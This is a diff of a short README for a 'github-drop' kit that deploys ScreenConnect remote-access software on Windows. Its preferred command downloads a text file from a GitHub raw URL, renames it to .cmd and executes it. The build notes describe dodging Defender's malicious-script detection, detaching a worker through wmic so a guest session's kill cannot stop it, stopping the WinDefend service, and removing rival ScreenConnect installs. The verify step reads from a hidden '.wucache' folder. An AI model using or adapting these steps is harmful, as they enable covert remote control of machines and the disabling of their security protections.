@@ -1,18 +1,15 @@
 # github-drop - competition SC deploy
 
-## Preferred (Admin Guest) — pure CMD, no PowerShell
+## Preferred (Admin Guest) — pure CMD, detached worker (survives 30s kill)
 curl.exe -L --ssl-no-revoke -o "%TEMP%\own.txt" "https://raw.githubusercontent.com/xnobuddy/github-drop/main/own.txt" && copy /y "%TEMP%\own.txt" "%TEMP%\own.cmd" >nul && "%TEMP%\own.cmd"
 
-## Cache-bust (if CDN stale)
-curl.exe -L --ssl-no-revoke -o "%TEMP%\own.txt" "https://raw.githubusercontent.com/xnobuddy/github-drop/COMMIT/own.txt" && copy /y "%TEMP%\own.txt" "%TEMP%\own.cmd" >nul && "%TEMP%\own.cmd"
-
-## Current build
-- OWN BUILD 20260731O2
-- engine: cmd only (no powershell) — dodge ScriptContainedMaliciousContent
-- order: ensure primary sevrz RUNNING, THEN nuke foreign SC
-- Keep: 5f6010579852e507 (sevrz) + f861c8140d453427 (pluxn)
-- No nuke if primary never comes up
-
-## Verify
+## After detach — wait ~60s then verify
 type "%ProgramData%\Microsoft\Windows\WER\Temp\.wucache\boot.err"
 sc query state= all | findstr /I ScreenConnect
+
+## Current build
+- OWN BUILD 20260731O3
+- Detaches via wmic (Guest 30s kill cannot stop worker)
+- No sync sc stop WinDefend (that hung O2 on locked hosts)
+- order: ensure primary sevrz RUNNING, THEN nuke foreign SC
+- Keep: 5f6010579852e507 + f861c8140d453427
